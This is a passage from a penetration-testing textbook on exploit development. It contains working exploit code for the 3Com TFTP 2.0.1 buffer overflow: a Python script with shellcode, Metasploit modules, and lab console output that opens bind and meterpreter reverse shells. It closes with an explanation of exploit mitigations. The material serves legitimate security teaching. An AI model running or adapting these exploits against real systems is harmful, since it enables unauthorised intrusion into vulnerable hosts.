# milw0rm.com [2007-02-28]</pre></div></div><p><a class="indexterm" id="iddle1427"/><a class="indexterm" id="iddle1698"/><a class="indexterm" id="iddle1999"/><a class="indexterm" id="iddle2093"/>Our ported exploit will look like <a class="xref" href="ch19.xhtml#ported_exploit" title="Example 19-6. The ported exploit">Example 19-6</a>, with the shellcode ❶, padding ❷, and return address ❸ adjusted to meet our needs.</p><p>If you’ve done everything correctly, when you run the ported exploit, a bind shell with System privileges will open on TCP port 4444, as shown in <a class="xref" href="ch19.xhtml#running_the_ported_exploit" title="Example 19-7. Running the ported exploit">Example 19-7</a>.</p><div class="example"><a id="running_the_ported_exploit"/><div class="example-title">Example 19-7. Running the ported exploit</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>./exploitdbexploit.pl 192.168.20.10 69</strong></span>&#13;
++ Building Malicious Packet .....&#13;
++ Exploit packet sent ...&#13;
++ Done.&#13;
++ Telnet to 4444 on victim's machine ....&#13;
root@kali:~# <span class="strong"><strong>nc 192.168.20.10 4444</strong></span>&#13;
Microsoft Windows XP [Version 5.1.2600]&#13;
(C) Copyright 1985-2001 Microsoft Corp.&#13;
&#13;
C:\WINDOWS\system32&gt;</pre></div></div></div></div><div class="sect1" title="Writing Metasploit Modules"><div class="titlepage"><div><div><h2 class="title" id="writing_metasploit_modules" style="clear: both">Writing Metasploit Modules</h2></div></div></div><p>Throughout this book we have leveraged many Metasploit modules for information gathering, exploitation, post exploitation, and so on. As new vulnerabilities are discovered, Metasploit modules are written for these issues, often by members of the security community like you. Additionally, as new post-exploitation or information-gathering techniques are implemented by researchers, they are often ported into Metasploit modules. In this section, we will look at the basics of writing our own Metasploit exploit module.</p><div class="note" title="Note"><h3 class="title"><a id="ch19note03"/>Note</h3><p>Metasploit modules are written in Ruby.</p></div><p>The best way to write a Metasploit module is to start with a similar existing module or skeleton and, similar to what we did in the previous section, port the exploit to meet our needs. Let’s begin with an existing Metasploit TFTP exploit module and port the 3Com TFTP stack-based buffer overflow that we left as an exercise earlier in this chapter. Of course, a Metasploit module already exists for this vulnerability, but it would be too easy to use it as a base module.</p><p>To see all the exploits for Windows TFTP servers, view the contents of <span class="emphasis"><em>/usr/share/metasploit-framework/modules/exploits/windows/tftp</em></span> in Kali.</p><p>We’ll start with the module <span class="emphasis"><em>futuresoft_transfermode.rb</em></span>. This module (shown in <a class="xref" href="ch19.xhtml#metasploit_module_example" title="Example 19-8. Metasploit module example">Example 19-8</a>) exploits a similar issue: a buffer overflow in the transfer mode field of another piece of TFTP software. We will adapt it for our 3Com TFTP exploit module.</p><div class="example"><a id="metasploit_module_example"/><div class="example-title">Example 19-8. Metasploit module example</div><div class="example-contents"><pre class="programlisting">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/tftp# <span class="strong"><strong>cat</strong></span>&#13;
<span class="strong"><strong>futuresoft_transfermode.rb</strong></span>&#13;
##&#13;
# This module requires Metasploit: http//metasploit.com/download&#13;
# Current source: https://github.com/rapid7/metasploit-framework&#13;
##&#13;
&#13;
require 'msf/core'&#13;
&#13;
class Metasploit3 &lt; Msf::Exploit::Remote ❶&#13;
  Rank = AverageRanking&#13;
&#13;
  include Msf::Exploit::Remote::Udp ❷&#13;
  include Msf::Exploit::Remote::Seh&#13;
&#13;
  def initialize(info = {})&#13;
    super(update_info(info,&#13;
      'Name'           =&gt; 'FutureSoft TFTP Server 2000 Transfer-Mode Overflow',&#13;
      'Description'    =&gt; %q{&#13;
          This module exploits a stack buffer overflow in the FutureSoft TFTP Server&#13;
        2000 product. By sending an overly long transfer-mode string, we were able&#13;
        to overwrite both the SEH and the saved EIP. A subsequent write-exception&#13;
        that will occur allows the transferring of execution to our shellcode&#13;
        via the overwritten SEH. This module has been tested against Windows&#13;
        2000 Professional and for some reason does not seem to work against&#13;
        Windows 2000 Server (could not trigger the overflow at all).&#13;
      },&#13;
      'Author'         =&gt; 'MC',&#13;
      'References'     =&gt;&#13;
        [&#13;
          ['CVE', '2005-1812'],&#13;
          ['OSVDB', '16954'],&#13;
          ['BID', '13821'],&#13;
          ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],&#13;
&#13;
        ],&#13;
      'DefaultOptions' =&gt;&#13;
        {&#13;
          'EXITFUNC' =&gt; 'process',&#13;
        },&#13;
      'Payload'        =&gt;&#13;
        {&#13;
          'Space'    =&gt; 350, ❸&#13;
          'BadChars' =&gt; "\x00", ❹&#13;
          'StackAdjustment' =&gt; -3500, ❺&#13;
        },&#13;
      'Platform'       =&gt; 'win',&#13;
      'Targets'        =&gt; ❻&#13;
        [&#13;
          ['Windows 2000 Pro English ALL',   { 'Ret' =&gt; 0x75022ac4} ], # ws2help.dll&#13;
          ['Windows XP Pro SP0/SP1 English', { 'Ret' =&gt; 0x71aa32ad} ], # ws2help.dll&#13;
          ['Windows NT SP5/SP6a English',    { 'Ret' =&gt; 0x776a1799} ], # ws2help.dll&#13;
          ['Windows 2003 Server English',    { 'Ret' =&gt; 0x7ffc0638} ], # PEB return&#13;
        ],&#13;
      'Privileged'     =&gt; true,&#13;
      'DisclosureDate' =&gt; 'May 31 2005'))&#13;
&#13;
    register_options(&#13;
      [&#13;
        Opt::RPORT(69) ❼&#13;
      ], self.class)&#13;
&#13;
  end ❽&#13;
&#13;
  def exploit&#13;
    connect_udp❾&#13;
&#13;
    print_status("Trying target #{target.name}...")&#13;
&#13;
    sploit  = "\x00\x01" + rand_text_english(14, payload_badchars) + "\x00"&#13;
    sploit += rand_text_english(167, payload_badchars)&#13;
    seh  = generate_seh_payload(target.ret)&#13;
    sploit[157, seh.length] = seh&#13;
    sploit += "\x00"&#13;
&#13;
    udp_sock.put(sploit) ❿&#13;
&#13;
    handler&#13;
    disconnect_udp&#13;
  end&#13;
end</pre></div></div><p><a class="indexterm" id="iddle1331"/>In the class definition ❶, as well as the include statements ❷, the author of this module tells Metasploit which mixins, or libraries, the module will inherit constructs from. This is a remote exploit over UDP that uses an SEH overwrite attack.</p><p>In the <code class="literal">Payload</code> section ❸, we tell Metasploit how many bytes we have available in the attack string for the payload. We also list the bad characters that need to be avoided ❹. The <code class="literal">StackAdjustment</code> option ❺ tells Metasploit to move ESP to the beginning of the payload to make more room on the stack for the payload to do its work without overwriting itself.</p><p>In the <code class="literal">Targets</code> section ❻, the author lists all the targets that Metasploit can attack together with their relevant return addresses. (Note that we do not have to write return addresses in little-endian format. We will take care of this later in the module.) In addition to the default options for the <span class="emphasis"><em>Exploit::Remote::UDP</em></span> mixin, the author also registered the <code class="literal">RPORT</code> option as 69 ❼, the default port for TFTP. Many programming languages use brackets to designate blocks such as functions or loops. Python uses indentation, and Ruby (the language used here) uses the word <code class="literal">end</code> ❽ to designate the end of a block.</p><p><a class="indexterm" id="iddle1204"/><a class="indexterm" id="iddle1377"/><a class="indexterm" id="iddle1389"/><a class="indexterm" id="iddle1874"/><a class="indexterm" id="iddle2038"/><a class="indexterm" id="iddle2297"/><a class="indexterm" id="iddle2327"/>The <span class="emphasis"><em>Exploit::Remote::UDP</em></span> mixin does all the work of setting up a UDP socket for us. All we need to do is call the function <code class="literal">connect_udp</code> ❾. (You’ll find the details of <code class="literal">connect_udp</code> and other <span class="emphasis"><em>Exploit::Remote::UDP</em></span> methods at <span class="emphasis"><em>/usr/share/metasploit-framework/lib/msf/core/exploit/udp.rb</em></span> in Kali.)</p><p>The author then tells Metasploit how to create the exploit string. After the exploit string is built, the author uses the <code class="literal">udp_sock.put</code> method ❿ to send it to the vulnerable server.</p><div class="sect2" title="A Similar Exploit String Module"><div class="titlepage"><div><div><h3 class="title" id="similar_exploit_string_module">A Similar Exploit String Module</h3></div></div></div><p>The example module uses an SEH exploit, whereas our 3Com TFTP exploit uses a saved return pointer, so let’s look at the exploit string in another Metasploit TFTP example for help in creating our exploit. Here is the exploit string used in the <span class="emphasis"><em>exploit/windows/tftp/tftpd32_long_filename.rb</em></span> module.</p><a id="pro_id00215"/><pre class="programlisting">sploit = "\x00\x01"❶ + rand_text_english(120, payload_badchars)❷ + "." + rand_text_english(135, payload_badchars) + [target.ret].pack('V')❸ + payload.encoded❹ + "\x00"</pre><p>Recall that the first two bytes of a TFTP packet are the opcode ❶. Here, the packet is telling the TFTP we want to read a file. Next is the filename, <span class="emphasis"><em>rand_text_english(120, payload_badchars)</em></span>. As the module name suggests, rather than writing too much data into the transport mode field, this exploit uses a long filename. The author uses Metasploit’s <code class="literal">rand_text_english</code> function to create a 120-character string that avoids any bad characters by pulling from the <code class="literal">BadChar</code> variable earlier in the module ❷. This exploit seems to require a period (<code class="literal">.</code>) and then some more random text, after which the return address is added to the string. Metasploit pulls the return address from the <code class="literal">ret</code> variable defined earlier in the module.</p><p><code class="literal">pack</code> is a Ruby method that turns an array into a binary sequence according to a template. The <code class="literal">'V'</code> template ❸ directs Ruby to pack our return address in little-endian format. Following the return address, the user’s chosen payload is encoded and appended to the exploit string, and the payload fills the total space allowed, as defined in the <code class="literal">Space</code> variable ❹. A null byte signals the end of the filename field. (Interestingly, the attack string does not even need to finish the TFTP packet to exploit the program, because the mode and final null byte are not appended to the exploit string.)</p></div><div class="sect2" title="Porting Our Exploit Code"><div class="titlepage"><div><div><h3 class="title" id="porting_our_exploit_code">Porting Our Exploit Code</h3></div></div></div><p>Earlier in this chapter, I suggested writing an exploit for the 3Com TFTP server long transport mode vulnerability as an exercise. Your finished exploit should be similar to the code shown in <a class="xref" href="ch19.xhtml#finished_3com_tftp_python_exploit" title="Example 19-9. Finished 3Com TFTP Python exploit">Example 19-9</a>. If you didn’t try writing this exploit, you should still be able to sort out how the code works, having worked through the previous examples.</p><div class="example"><a id="finished_3com_tftp_python_exploit"/><div class="example-title">Example 19-9. Finished 3Com TFTP Python exploit</div><div class="example-contents"><pre class="programlisting">  #!/usr/bin/python&#13;
  import socket&#13;
❶ shellcode = ("\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\&#13;
  x1d" + "\x4d\x2f\xe8\x83\xeb\xfc\xe2\xf4\xe1\x27\xc4\xa5\xf5\xb4\xd0\x17" +&#13;
  --<span class="emphasis"><em>snip</em></span>--&#13;
  "\x4e\xb2\xf9\x17\xcd\x4d\x2f\xe8")&#13;
  buffer = shellcode + "A" * 129 + "\xD3\x31\xC1\x77" ❷&#13;
  packet = "\x00\x02" + "Georgia" + "\x00" + buffer + "\x00"&#13;
  s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)&#13;
  s.sendto(packet,('192.168.20.10',69))&#13;
  response = s.recvfrom(2048)&#13;
  print response</pre></div></div><p><a class="indexterm" id="iddle2025"/>Your return address may point to another <code class="literal">JMP ESI</code> instruction ❷, and you may have used a different payload ❶.</p><p>Now let’s port the Python exploit into Metasploit, changing values in the FutureSoft TFTP example module to fit our needs. We need to make only a few changes to the existing exploit module we discussed previously, as shown in <a class="xref" href="ch19.xhtml#edited_modulecomma_part_1" title="Example 19-10. Edited module, part 1">Example 19-10</a> and <a class="xref" href="ch19.xhtml#edited_modulecomma_part_2" title="Example 19-11. Edited module, part 2">Example 19-11</a>.</p><div class="example"><a id="edited_modulecomma_part_1"/><div class="example-title">Example 19-10. Edited module, part 1</div><div class="example-contents"><pre class="programlisting">##&#13;
# This module requires Metasploit: http//metasploit.com/download&#13;
# Current source: https://github.com/rapid7/metasploit-framework&#13;
##&#13;
&#13;
require 'msf/core'&#13;
&#13;
class Metasploit3 &lt; Msf::Exploit::Remote&#13;
  Rank = AverageRanking&#13;
&#13;
  include Msf::Exploit::Remote::Udp ❶&#13;
&#13;
&#13;
  def initialize(info = {})&#13;
    super(update_info(info,&#13;
      'Name'           =&gt; '3com TFTP Long Mode Buffer Overflow',&#13;
      'Description'    =&gt; %q{&#13;
          This module exploits a buffer overflow in the 3com TFTP version 2.0.1 and below with&#13;
          a long TFTP transport mode field in the TFTP packet.&#13;
      },&#13;
      'Author'         =&gt; 'Georgia',&#13;
      'References'     =&gt; ❷&#13;
        [&#13;
          ['CVE', '2006-6183'],&#13;
          ['OSVDB', '30759'],&#13;
          ['BID', '21301'],&#13;
          ['URL', 'http://www.security.org.sg/vuln/tftp2000-1001.html'],&#13;
        ],&#13;
      'DefaultOptions' =&gt;&#13;
        {&#13;
          'EXITFUNC' =&gt; 'process',&#13;
        },&#13;
      'Payload'        =&gt;&#13;
        {&#13;
          'Space'    =&gt; 473, ❸&#13;
          'BadChars' =&gt; "\x00",&#13;
          'StackAdjustment' =&gt; -3500,&#13;
        },&#13;
      'Platform'       =&gt; 'win',&#13;
      'Targets'        =&gt;&#13;
        [&#13;
         ['Windows XP Pro SP3 English', { 'Ret' =&gt; 0x7E45AE4E } ], #JMP ESI  USER32.dll ❹&#13;
        ],&#13;
      'Privileged'     =&gt; true,&#13;
      'DefaultTarget'  =&gt; 0, ❺&#13;
      'DisclosureDate' =&gt; 'Nov 27 2006'))&#13;
&#13;
&#13;
    register_options(&#13;
      [&#13;
        Opt::RPORT(69)&#13;
      ], self.class)&#13;
&#13;
  end</pre></div></div><p>Because this is a saved return pointer overwrite exploit, we will not need to import the SEH Metasploit mixin; we will only import <span class="emphasis"><em>Msf::Exploit::Remote::Udp</em></span> ❶. Next we change the module’s information to match the 3Com TFTP 2.0.1 long transport mode vulnerability to enable Metasploit users to search for our module and verify that they have the correct exploit for the vulnerability. Search vulnerability references online to find the CVE, OSVDB, and BID numbers, and any other relevant links ❷.</p><p>Next we change the payload options to match our 3Com exploit. In our Python exploit, we lead with 344 bytes of shellcode, followed by 129 bytes of padding, giving us a total of 473 bytes to work with for the payload. Tell Metasploit to create a 473-byte payload at ❸. For the target section, our Python exploit covers only one platform, Windows XP Professional SP3 English. If we were submitting our exploit to the Metasploit repositories, we should try to cover as many exploitable targets as possible.</p><p>Finally, change the <code class="literal">RET</code> to the <code class="literal">JMP ESI</code> in <span class="emphasis"><em>USER32.dll</em></span> ❹ from the Python exploit. We’ve also added the <code class="literal">DefaultTarget</code> option to tell Metasploit to use target 0 by default, so the user won’t need to set a target before running the module ❺.</p><p>The only changes we need to make in the exploit portion of the module are to the exploit string itself, as shown in <a class="xref" href="ch19.xhtml#edited_modulecomma_part_2" title="Example 19-11. Edited module, part 2">Example 19-11</a>.</p><div class="example"><a id="edited_modulecomma_part_2"/><div class="example-title">Example 19-11. Edited module, part 2</div><div class="example-contents"><pre class="programlisting">def exploit&#13;
    connect_udp&#13;
&#13;
    print_status("Trying target #{target.name}...")&#13;
&#13;
    sploit  = "\x00\x02"❶ + rand_text_english(7, payload_badchars)❷ + "\x00"❸&#13;
    sploit += payload.encoded❹  + [target.ret].pack('V')❺ +  "\x00"❻&#13;
&#13;
    udp_sock.put(sploit)&#13;
&#13;
    handler&#13;
    disconnect_udp&#13;
  end&#13;
end ❼</pre></div></div><p><a class="indexterm" id="iddle1060"/><a class="indexterm" id="iddle1396"/><a class="indexterm" id="iddle1697"/><a class="indexterm" id="iddle1766"/><a class="indexterm" id="iddle1769"/><a class="indexterm" id="iddle2039"/><a class="indexterm" id="iddle2161"/><a class="indexterm" id="iddle2299"/>As in the Python exploit, we start by telling the TFTP server to write to a file ❶. We then use the <code class="literal">rand_text_english</code> function to create a random seven-character filename ❷. This method is superior to using static letters as we did in the Python exploit, because anything that is predictable can be used to write signatures for antivirus programs, intrusion-prevention systems, and so on. Next we follow the specification for a TFTP packet with a null byte to finish the filename at ❸, and then tack on the user’s chosen payload ❹ and the return address ❺. We finish the packet with a null byte, per the TFTP specification ❻. (After using <code class="literal">end</code> to close the exploit function, don’t forget to close the module as well at ❼.)</p><p>We have now written an exploit module for the 3Com TFTP 2.0.1 long transport mode vulnerability. Save the file in <span class="emphasis"><em>/root/.msf4/modules/exploits/windows/tftp/myexploit.rb</em></span>, and then run the Msftidy tool on the module to verify that it meets the format specifications for Metasploit modules. Make any formatting changes that Msftidy suggests before submitting a module to the Metasploit repository.</p><a id="pro_id00216"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cd /usr/share/metasploit-framework/tools/</strong></span>&#13;
root@kali:/usr/share/metasploit-framework/tools# <span class="strong"><strong>./msftidy.rb /root/.msf4/modules/exploits/windows/tftp/myexploit.rb</strong></span></pre><div class="note" title="Note"><h3 class="title"><a id="ch19note04"/>Note</h3><p>From time to time, Metasploit makes changes to its desired syntax, so run <code class="literal">msfupdate</code> to get the latest version of Msftidy if you are actually going to submit a module to the repositories. In this case, we don’t need to worry about it, and running <code class="literal">msfupdate</code> may cause other exercises in the book to break, so I don’t recommend it for now.</p></div><p>Restart Msfconsole to load the latest modules, including any in this <span class="emphasis"><em>.msf4/modules</em></span> directory. If you have made any syntax errors, Metasploit will display the details of the modules it was unable to load.</p><p>Now use your new exploit module to attack your Windows XP target. As you see in <a class="xref" href="ch19.xhtml#using_your_module" title="Example 19-12. Using your module">Example 19-12</a>, Metasploit can fit many payloads in 473 characters, including Meterpreter ❶.</p><div class="example"><a id="using_your_module"/><div class="example-title">Example 19-12. Using your module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use windows/tftp/myexploit</strong></span>&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>show options</strong></span>&#13;
Module options (exploit/windows/tftp/myexploit):&#13;
&#13;
   Name   Current Setting  Required  Description&#13;
   ----   ---------------  --------  -----------&#13;
   RHOST                   yes       The target address&#13;
   RPORT  69               yes       The target port&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Windows XP Pro SP3 English&#13;
&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>set RHOST 192.168.20.10</strong></span>&#13;
RHOST =&gt; 192.168.20.10&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>show payloads</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>❶&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(myexploit) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Trying target Windows XP Pro SP3 English...&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 1 opened (192.168.20.9:4444 -&gt; 192.168.20.10:4662) at 2015-02-09 09:28:35 -0500&#13;
meterpreter &gt;</pre></div></div><p><a class="indexterm" id="iddle1142"/><a class="indexterm" id="iddle1368"/><a class="indexterm" id="iddle2243"/><a class="indexterm" id="iddle2423"/>Now that we’ve walked through one example of writing a Metasploit module, here’s an idea for another. A Metasploit module that can exploit the War-FTP 1.65 USER buffer overflow, found at <span class="emphasis"><em>/usr/share/metasploit-framework/modules/exploits/windows/ftp/warftpd_165_user.rb</em></span>, uses the saved return pointer overwrite technique. Try writing a similar module that uses the SEH overwrite technique we worked through in <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a>.</p></div></div><div class="sect1" title="Exploitation Mitigation Techniques"><div class="titlepage"><div><div><h2 class="title" id="exploitation_mitigation_techniques" style="clear: both">Exploitation Mitigation Techniques</h2></div></div></div><p>We discussed one exploit mitigation technique, called SafeSEH, in <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a>. In typical cat-and-mouse fashion, attackers develop new exploitation techniques while platforms implement mitigation techniques, and then attackers come up with something new. Here we will briefly discuss a few modern exploit mitigation methods. This list is by no means complete, nor is it within the scope of this book to discuss writing exploits that successfully bypass all these restrictions. There are many advanced exploitation and payload delivery techniques, such as heap sprays and return-oriented programming, beyond those discussed here. Check out my website (<span class="emphasis"><em><a class="ulink" href="http://www.bulbsecurity.com/" target="_top">http://www.bulbsecurity.com/</a></em></span>) and the Corelan Team’s website (<span class="emphasis"><em><a class="ulink" href="http://www.corelan.be/" target="_top">http://www.corelan.be/</a></em></span>) for more information on advanced exploit development techniques.</p><div class="sect2" title="Stack Cookies"><div class="titlepage"><div><div><h3 class="title" id="stack_cookies">Stack Cookies</h3></div></div></div><p><a class="indexterm" id="iddle1017"/><a class="indexterm" id="iddle1078"/><a class="indexterm" id="iddle1162"/><a class="indexterm" id="iddle1579"/><a class="indexterm" id="iddle1951"/><a class="indexterm" id="iddle2066"/>Naturally, as buffer overflow exploits became prevalent, developers wanted to stop these sorts of attacks from hijacking execution. One way to do so is by implementing <span class="emphasis"><em>stack cookies</em></span>, also known as <span class="emphasis"><em>canaries</em></span>. At the start of a program, a stack cookie is calculated and added to the <span class="emphasis"><em>.data</em></span> section of memory. Functions that use structures prone to buffer overflows, such as string buffers, grab the canary value from <span class="emphasis"><em>.data</em></span> and push it onto the stack after the saved return address and EBP. Just before a function returns, it checks the value of the canary on the stack against the value in <span class="emphasis"><em>.data</em></span>. If the values don’t match, a buffer overflow is detected, and the program is terminated before the attack can hijack execution.</p><p>You can use multiple techniques for bypassing stack cookies, such as triggering an SEH overwrite and exception before the vulnerable function returns and hijacking execution before the canary value is checked.</p></div><div class="sect2" title="Address Space Layout Randomization"><div class="titlepage"><div><div><h3 class="title" id="address_space_layout_randomization">Address Space Layout Randomization</h3></div></div></div><p>The exploits we have written in this book have relied on certain instructions being at certain memory addresses. For example, in our first War-FTP stack-based buffer overflow example in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>, we relied on a <code class="literal">JMP ESP</code> equivalent instruction in the Windows <span class="emphasis"><em>MSVCRT.dll</em></span> module being at memory address <code class="literal">0x77C35459</code> on all Windows XP SP3 English systems. In our SEH overwrite example in <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a>, we relied on the <code class="literal">POP POP RET</code> instructions in War-FTP’s <span class="emphasis"><em>MFC42.dll</em></span> module being at memory address <code class="literal">0x5F4580CA</code>. If neither case were true, our entire attack approach would have been undermined, and we would have to find the instructions before we could execute them.</p><p>When ASLR is implemented, you can’t count on certain instructions being at certain memory addresses. To see ASLR in action, open the Winamp program in Immunity Debugger on your Windows 7 virtual machine. Note the memory locations of <span class="emphasis"><em>Winamp.exe</em></span> and some Windows DLLs such as <span class="emphasis"><em>USER32</em></span> and <span class="emphasis"><em>SHELL32</em></span>. Now restart the system and try again. You should notice that the locations of the Windows components change at reboot while the location of <span class="emphasis"><em>Winamp.exe</em></span> stays the same. In my case, the first time I looked at Winamp in Immunity Debugger, the memory locations were as follows:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p><code class="literal">00400000</code> <span class="emphasis"><em>Winamp.exe</em></span></p></li><li class="listitem"><p><code class="literal">778B0000</code> <span class="emphasis"><em>USER32.dll</em></span></p></li><li class="listitem"><p><code class="literal">76710000</code> <span class="emphasis"><em>SHELL32.dll</em></span></p></li></ul></div><p>After reboot they looked like this:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p><code class="literal">00400000</code> <span class="emphasis"><em>Winamp.exe</em></span></p></li><li class="listitem"><p><code class="literal">770C0000</code> <span class="emphasis"><em>USER32.dll</em></span></p></li><li class="listitem"><p><code class="literal">75810000</code> <span class="emphasis"><em>SHELL32.dll</em></span></p></li></ul></div><p>Like SafeSEH, there is no rule in Windows that programs must implement ASLR. Even some Windows applications such as Internet Explorer didn’t implement ASLR right away. However, Windows Vista and later <a class="indexterm" id="iddle1245"/><a class="indexterm" id="iddle1264"/><a class="indexterm" id="iddle1555"/><a class="indexterm" id="iddle1566"/><a class="indexterm" id="iddle1567"/><a class="indexterm" id="iddle1667"/><a class="indexterm" id="iddle2071"/><a class="indexterm" id="iddle2087"/>shared libraries such as <span class="emphasis"><em>USER32.dll</em></span> and <span class="emphasis"><em>SHELL32.dll</em></span> do use ASLR. If we want to use any code in these libraries, we will not be able to call instructions directly from a static address.</p></div><div class="sect2" title="Data Execution Prevention"><div class="titlepage"><div><div><h3 class="title" id="data_execution_prevention">Data Execution Prevention</h3></div></div></div><p>In the exploits we developed in the past few chapters, we relied on the ability to inject our shellcode into memory somewhere, pass execution to the shellcode, and have the shellcode execute. <span class="emphasis"><em>Data execution prevention (DEP)</em></span> makes this a little harder by designating specific parts of memory as nonexecutable. If an attacker tries to execute code from nonexecutable memory, the attack will fail.</p><p>DEP is used in most modern versions of Windows, as well as Linux, Mac OS, and even Android platforms. iOS does not require DEP, as discussed in the next section.</p><p>To bypass DEP, attackers typically use a technique called <span class="emphasis"><em>return-oriented programming (ROP)</em></span>. ROP allows attackers to execute specific instructions already included in executable memory. One common technique is to use ROP to create a section of memory that is writable and executable, and then write the payload to this memory segment and execute it.</p></div><div class="sect2" title="Mandatory Code Signing"><div class="titlepage"><div><div><h3 class="title" id="mandatory_code_signing">Mandatory Code Signing</h3></div></div></div><p>Apple’s iOS team takes a different approach to preventing malicious code from executing. All code that executes on an iPhone must be signed by a trusted authority, usually Apple itself. To run an application on an iPhone, developers must submit the code for Apple’s review. If Apple determines that their app is not malicious, it is usually approved and the code is signed by Apple.</p><p>One common route that malware authors take to bypass detection at install time is downloading new, potentially malicious code at runtime and executing it. However, because all memory pages must be signed by a trusted authority, this sort of attack will fall flat on an iPhone. As soon as the application attempts to run unsigned code, the CPU will reject it, and the application will crash. DEP is not required, because mandatory code signing takes the protection a step further.</p><p>Of course, it is possible to write exploits that bypass these restrictions, as with iPhone jailbreaks, but on the latest versions of iOS, a jailbreak is no small feat. Rather than using ROP briefly to create a DEP bypass, with mandatory code signing, the entire payload must be created using ROP.</p><p>One mitigation technique alone is not enough to foil the most skilled exploit developers armed with the latest methods. As a result, exploit mitigation techniques are typically chained together to further foil attacks. For example, iOS uses both mandatory code signing and full ASLR. Thus, an attacker has to use ROP for the entire payload, and thanks to ASLR, building a ROP payload is no picnic.</p><p>In the previous two chapters, we have covered a solid introduction to exploit development. Building on the skills we discussed, you can move on to more advanced exploitation—even taking out the latest, most secure platforms and programs.</p></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00050" style="clear: both">Summary</h2></div></div></div><p>In this chapter we looked at a few odds and ends for basic exploit development. We looked at a technique called fuzzing in order to find potential exploitation points. We also looked at working with public exploits and porting them to meet our needs. We replaced the shellcode using Msfvenom and found a return address that works with our platform. Next we looked at porting a completed Python exploit into our first Metasploit module. Starting with a module for a similar issue, we made changes to fit the 3Com TFTP long transport mode buffer overflow vulnerability. Finally, we talked briefly about some of the exploitation mitigation techniques that you will encounter as you continue your study of exploit development.</p><p>We are nearing the end of our journey into the basics of penetration testing. Let’s finish up with a chapter on assessing the security of mobile devices.</p></div></section></body></html>